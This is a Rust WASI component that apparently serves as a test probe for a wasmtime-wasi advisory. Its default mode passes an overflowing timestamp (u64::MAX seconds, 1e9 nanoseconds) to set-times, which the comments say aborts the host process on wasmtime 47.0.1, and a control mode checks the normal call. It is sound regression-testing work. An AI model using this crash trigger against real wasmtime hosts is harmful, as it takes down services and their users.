//! WASI 0.2 component probe for GHSA-j2g9-4prp-pf6h (wasmtime-wasi
//! filesystem datetime overflow, published 2026-09-24).
//!
//! Default mode: calls `descriptor.set-times` on the first preopen with
//! `NewTimestamp::Timestamp(Datetime { seconds: u64::MAX, nanoseconds:
//! 1_000_000_000 })` — the seconds+nanoseconds record whose conversion
//! overflows `Duration::new` on the host (Rust panic). On wasmtime 47.0.1
//! the in-process run aborts the embedding process (SIGABRT); the
//! subprocess path contains the abort to the worker.
//!
//! Control mode (`argv` contains "control"): the same set-times call with
//! `NewTimestamp::Now` — must succeed, proving the preopen grant and the
//! set-times rights are fine and ONLY the overflowing datetime panics.
//!
//! Rebuild: benchmarks/component_probes/rebuild.sh (cargo wasm32-wasip2 +
//! wasm-tools strip).
use wasi::filesystem::preopens::get_directories;
use wasi::filesystem::types::{Datetime, NewTimestamp};

fn main() {
    let control = std::env::args().any(|a| a == "control");
    let dirs = get_directories();
    if dirs.is_empty() {
        println!("NO-PREOPEN");
        return;
    }
    let (desc, _path) = dirs.into_iter().next().unwrap();
    let ts = if control {
        NewTimestamp::Now
    } else {
        NewTimestamp::Timestamp(Datetime {
            seconds: u64::MAX,
            nanoseconds: 1_000_000_000,
        })
    };
    match desc.set_times(ts, NewTimestamp::NoChange) {
        Ok(()) => println!("SET-TIMES:OK"),
        Err(e) => println!("SET-TIMES:ERR:{:?}", e),
    }
}
